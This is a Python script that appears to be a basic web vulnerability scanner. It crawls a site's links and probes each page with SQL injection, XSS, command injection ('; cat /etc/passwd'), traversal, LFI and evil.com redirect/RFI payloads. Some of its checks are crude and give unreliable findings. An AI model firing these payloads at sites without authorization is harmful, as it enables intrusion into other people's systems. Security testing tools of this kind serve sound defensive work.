import requests
import re
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import webbrowser
import argparse


def scan_website(url):
    try:
        print(f"Scanning website: {url}\n")

        # Step 1: Discover URLs on the website
        discovered_urls = discover_urls(url)
        print(f"Discovered {len(discovered_urls)} URLs on {url}:\n")
        for i, discovered_url in enumerate(discovered_urls, start=1):
            print(f"{i}. {discovered_url}")

        # Step 2: Scan discovered URLs for vulnerabilities
        for page_url in discovered_urls:
            vulnerabilities = scan_url(page_url)
            if vulnerabilities:
                print(f"\nVulnerabilities found on {page_url}:")
                for vulnerability, attack_method in vulnerabilities.items():
                    print(f"\n- Vulnerability: {vulnerability}")
                    print(f"  Attack Method: {attack_method}")
                    handle_exploitation(vulnerability, page_url)
    except Exception as e:
        print(f"An error occurred: {e}")


def discover_urls(url):
    discovered_urls = []
    try:
        response = requests.get(url)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, "html.parser")
            for anchor_tag in soup.find_all("a"):
                href = anchor_tag.get("href")
                if href:
                    absolute_url = urljoin(url, href)
                    discovered_urls.append(absolute_url)
        else:
            print(f"Failed to retrieve URLs from {url}. Status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"Failed to retrieve URLs from {url}: {e}")
    return discovered_urls


def scan_url(url):
    vulnerabilities = {}

    if is_sql_injection_vulnerable(url):
        vulnerabilities["SQL Injection"] = "Injecting SQL code into input fields"
    if is_xss_vulnerable(url):
        vulnerabilities["Cross-Site Scripting (XSS)"] = "Injecting malicious scripts into input fields"
    if has_insecure_configuration(url):
        vulnerabilities["Insecure Server Configuration"] = "Exploiting insecure communication protocols"
    if is_open_redirect_vulnerable(url):
        vulnerabilities["Open Redirect"] = "Redirecting users to malicious sites"
    if is_command_injection_vulnerable(url):
        vulnerabilities["Command Injection"] = "Executing system commands via input fields"
    if is_directory_traversal_vulnerable(url):
        vulnerabilities["Directory Traversal"] = "Accessing unauthorized files on the server"
    if is_rfi_vulnerable(url):
        vulnerabilities["Remote File Inclusion (RFI)"] = "Including external files on the server"
    if is_lfi_vulnerable(url):
        vulnerabilities["Local File Inclusion (LFI)"] = "Including local files on the server"
    if is_csrf_vulnerable(url):
        vulnerabilities["Cross-Site Request Forgery (CSRF)"] = "Performing unauthorized actions on behalf of a user"

    return vulnerabilities


def is_sql_injection_vulnerable(url):
    payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #", "admin'--", "' OR 'a'='a"]
    for payload in payloads:
        try:
            response = requests.get(url + "?id=" + payload)
            if re.search(r"error|warning|syntax|mysql|mysqli|pdo|odbc", response.text, re.IGNORECASE):
                return True
        except requests.RequestException as e:
            print(f"Error testing SQL Injection on {url} with payload '{payload}': {e}")
    return False


def is_xss_vulnerable(url):
    payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
                "'\"><script>alert('XSS')</script>"]
    for payload in payloads:
        try:
            response = requests.get(url + "?input=" + payload)
            if payload in response.text:
                return True
        except requests.RequestException as e:
            print(f"Error testing XSS on {url} with payload '{payload}': {e}")
    return False


def has_insecure_configuration(url):
    return not url.startswith("https")


def is_open_redirect_vulnerable(url):
    payloads = ["/?redirect=http://evil.com", "/?url=http://evil.com", "/?next=http://evil.com"]
    for payload in payloads:
        try:
            response = requests.get(url + payload)
            if "http://evil.com" in response.url:
                return True
        except requests.RequestException as e:
            print(f"Error testing Open Redirect on {url} with payload '{payload}': {e}")
    return False


def is_command_injection_vulnerable(url):
    payloads = ["; ls", "&& ls", "| ls", "; cat /etc/passwd", "&& cat /etc/passwd"]
    for payload in payloads:
        try:
            response = requests.get(url + "?cmd=" + payload)
            if "root:x:" in response.text or "bin" in response.text:
                return True
        except requests.RequestException as e:
            print(f"Error testing Command Injection on {url} with payload '{payload}': {e}")
    return False


def is_directory_traversal_vulnerable(url):
    payloads = ["../../../../etc/passwd", "../etc/passwd", "../../etc/passwd"]
    for payload in payloads:
        try:
            response = requests.get(url + "?file=" + payload)
            if "root:x:" in response.text:
                return True
        except requests.RequestException as e:
            print(f"Error testing Directory Traversal on {url} with payload '{payload}': {e}")
    return False


def is_rfi_vulnerable(url):
    payloads = ["http://evil.com/malicious.txt", "https://evil.com/malicious.txt"]
    for payload in payloads:
        try:
            response = requests.get(url + "?file=" + payload)
            if "malicious" in response.text:
                return True
        except requests.RequestException as e:
            print(f"Error testing Remote File Inclusion (RFI) on {url} with payload '{payload}': {e}")
    return False


def is_lfi_vulnerable(url):
    payloads = ["file:///etc/passwd", "file:///proc/self/environ"]
    for payload in payloads:
        try:
            response = requests.get(url + "?file=" + payload)
            if "root:x:" in response.text:
                return True
        except requests.RequestException as e:
            print(f"Error testing Local File Inclusion (LFI) on {url} with payload '{payload}': {e}")
    return False


def is_csrf_vulnerable(url):
    try:
        response = requests.get(url)
        if "csrf" not in response.text.lower():
            return True
    except requests.RequestException as e:
        print(f"Error testing CSRF on {url}: {e}")
    return False


def handle_exploitation(vulnerability, url):
    print(f"Exploiting {vulnerability} on {url}")
    webbrowser.open(url)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Scan a website for vulnerabilities.")
    parser.add_argument("url", help="The URL of the website to scan")

    args = parser.parse_args()

    scan_website(args.url)
